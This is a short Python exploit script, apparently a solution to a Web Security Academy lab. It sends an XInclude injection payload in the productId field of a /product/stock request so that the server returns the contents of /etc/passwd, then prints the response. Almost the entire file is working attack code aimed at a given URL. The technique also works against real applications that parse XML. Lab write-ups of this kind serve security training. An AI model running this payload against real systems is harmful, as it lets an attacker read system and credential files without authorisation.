#!/bin/env python3
import requests
import sys
import urllib3
from urllib.parse import urlparse
from bs4 import BeautifulSoup 
from colorama import init
from re import findall

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

header = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
	'Content-Type': 'application/x-www-form-urlencoded',
	}

def exploit_xxe(url):
	stock_path = '/product/stock'
	params = """productId=<dog xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></dog>&storeId=1"""
	req = requests.post(url + stock_path, data=params, headers=header, verify=False, allow_redirects=False, proxies=proxies)

	if req.status_code == 400 and 'Invalid product ID' in req.text:
		print("\033[32m[+] Exploiting XInclude successful.")
		print("\033[36m[*] Response:")
		print(req.text)
	else:
		print("\033[1;31;40m[-] Exploiting XInclude to retrieve files not successful.")
		sys.exit(-1)

def main():
	if len(sys.argv) != 2:
		print("\033[36m[+] Usage: {0} <url>".format(sys.argv[0]))
		print("\033[36m[+] Example: {0} https://xxx.web-security-academy.net".format(sys.argv[0]))
		sys.exit(-1)

	o = urlparse(sys.argv[1])
	url = o.scheme + "://" + o.hostname
	print("\033[36m[+] Checking exploiting XInclude to retrieve files...")
	exploit_xxe(url)

if __name__ == "__main__":
	main()
